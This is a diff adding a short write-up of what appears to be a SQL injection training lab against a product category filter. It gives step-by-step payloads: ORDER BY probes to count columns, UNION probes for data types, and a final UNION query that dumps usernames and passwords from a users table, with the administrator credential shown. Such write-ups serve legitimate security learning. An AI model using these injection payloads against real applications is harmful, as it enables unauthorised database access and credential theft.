@@ -1,0 +1,32 @@
+SQLi - Product category filter
+
+End Goals: 
+- Output usernames & passwords in the users table
+- Login as administrator usernames
+
+ANALYSIS
+
+1. Determine the number of columns that the vulnerable query is using (iteratively)
+
+' order by 1--  # 200 response code => Column exists
+' order by 2--  # 200 response code => Column exists
+' order by 3--  # "Internal Server Error" => Column doesn't exists
+
+This means the table has only 2 columns
+
+2. Determine column data type
+
+select a, b from products where category='Gifts'
+' UNION select 'a', NULL--  # 200 response code
+' UNION select NULL, 'a'--  # 200 response code
+
+Both columns are of data type "string" => We can use both columns to output data from other tables in the DB
+
+We can do this as below:
+
+' UNION select username, password from users--
+
+We get below:
+
+administrator
+cflulahwxqqlcjnbuugj
